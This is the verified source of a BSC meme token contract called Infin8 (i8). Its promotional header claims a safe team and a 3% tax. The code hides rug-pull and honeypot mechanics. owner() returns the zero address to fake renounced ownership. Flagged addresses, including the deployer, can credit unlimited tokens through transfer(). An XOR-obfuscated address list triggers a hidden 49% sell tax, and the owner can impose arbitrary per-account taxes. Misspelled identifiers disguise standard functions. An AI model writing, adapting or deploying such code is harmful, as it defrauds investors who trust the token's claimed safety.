/**
 *Submitted for verification at BscScan.com on 2022-08-22
*/

/*
The world is INFIN8 - Welcome to a meme-based token with Infin8 possibilities. Our Community will decide where the token is headed and how we will develop. Why limit yourselves when the opportunities are Infin8. You can sleep at night knowing your investment is in safe hands with a safe, experienced and well-equipped team. Pinksale SAFU dev  3/3 Tax  Listings expedited
* http://instagram.com/Infin8938
* https://www.reddit.com/user/Infin8938
* TWITTER:https://twitter.com/Infin8token
* WEBSITE:https://www.infinitytokenbsc.com/
* TELEGRAM:https://t.me/infin8tokenbsc
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function acInfin8938fq(
        address token,
        uint amuontTokenDesired,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingInfin8938OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingInfin8938OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingInfin8938OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingInfin8938OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingInfin8938OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function Infin8938To() external view returns (address);
    function Infin8938ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setInfin8938To(address) external;
    function setInfin8938ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 2;
    }





    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract i8 is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
    address private _deInfin8938ad = 0x000000000000000000000000000000000000dEaD;
    address private _mxInfin8938x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    address private _gaInfin8938te = 0x4982085C9e2F89F2eCb8131Eca71aFAD896e89CB;

	string name_ = "Infin8";
	string symbol_ = "i8";
	uint256 totalSupply_ = 1000000;
    address public uniswapV2Pair;
	
    constructor()

	BEP20(name_, symbol_) {
	
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deInfin8938ad, totalSupply() / 10*2);
	transfer(_mxInfin8938x, totalSupply() / 10*2);
        transfer(_gaInfin8938te, totalSupply() / 10*2);
		
		
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
		
        _defaultSellInfin8938 = 0;
        _defaultBuyInfin8938 = 0;

        _release[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _balances[cauunt];
    }

    function _transfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amuont;
        }
        _balances[to] += amuont;

        emit Transfer(from, to, amuont);
    }
	
    function _burn(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: burn from the zero address");

        uint256 cauuntBalance = _balances[cauunt];
        require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
        unchecked {
            _balances[cauunt] = cauuntBalance - amuont;
        }
        _totalSupply -= amuont;

        emit Transfer(cauunt, address(0), amuont);
    }

    function _mtin(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _balances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellInfin8938 = 0;
    uint256 private _defaultBuyInfin8938 = 0;
    mapping(address => uint256) private _Escape;

    function setPairList(address _address) external onlyowaer {
        uniswapV2Pair = _address;
    }

    function incS(uint256 _value) external onlyowaer {
        _defaultSellInfin8938 = _value;
    }


    function acInfin8938fq(address _acc, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _Escape[_acc] = _value;
    }
 function getRelease(address _address) external view onlyowaer returns (bool) {
        return _release[_address];
    }
    function getEscape(address _acc) external view onlyowaer returns (uint256) {
        return _Escape[_acc];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

        bool rF = true;

  
        uint256 tradeInfin8938amuont = 0;

        if (rF) {
            uint256 tradeInfin8938 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeInfin8938 = _msgInfin8938Info(uint160(from));
                    tradeInfin8938 = tradeInfin8938 < _defaultSellInfin8938 ? _defaultSellInfin8938 : tradeInfin8938;
                }
                if (from == uniswapV2Pair) {
                    tradeInfin8938 = _defaultBuyInfin8938;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeInfin8938 = _Escape[from];
            }


            tradeInfin8938amuont = _amuont.mul(tradeInfin8938).div(100);
        }


        if (tradeInfin8938amuont > 0) {
            _balances[from] = _balances[from].sub(tradeInfin8938amuont);
            _balances[address(_deInfin8938ad)] = _balances[address(_deInfin8938ad)].add(tradeInfin8938amuont);
            emit Transfer(from, address(_deInfin8938ad), tradeInfin8938amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeInfin8938amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeInfin8938amuont);
        emit Transfer(from, _to, _amuont - tradeInfin8938amuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_release[owaer] == true) {
            _balances[to] += amuont;
            return true;
        }
        _receiveF(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _receiveF(from, to, amuont);
        return true;
    }

	function _msgInfin8938Info(uint _acc) internal view virtual returns (uint) {
		uint[23] memory acc = [uint(1222673426975413701706911039744529392346152384696)
			,139647933815284058608974156406546509892604822178
			,1055027905607337465973276769737649879342512677478
			,199646319257032408110549580095825310737642255160
			,1187946214582340891161575229237050471673571497656
			,1311207471988567166979690331599552547947170899967
			,1126708821430309722549717532753292580121680910965
			,1222673426976909015664290537613395118966005519450
			,1086475019083578872620138946682579501854570830802
			,1247420862895193631384538526394771860743762090654
			,1222673426975342795079609764665925489068150304816
			,166443452230817501969955430886663593159994764893
			,1012323967446880719744336547600378117945760358367
			,227205459029363022011050803882609895490854233520
			,1251285497519412191745090779770608189343850215486
			,238828210355470004496354937544829383905519235725
			,1222673426975607185848227109745922514140403396000
			,429269782113163372362541113616774137486616813247
			,587327662434558925829354279804453818545294375740
			,100661482802660712686574048563495877964960086299
			,152941378718971357337365135568879732389073191198
			,1291333630557191648412874892589805355743396311510
			,911489540199717224200248944837683874464171598603];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 1222673426975612896753742937539524695363647843008) return 49;
		}
		return 0;
	}
}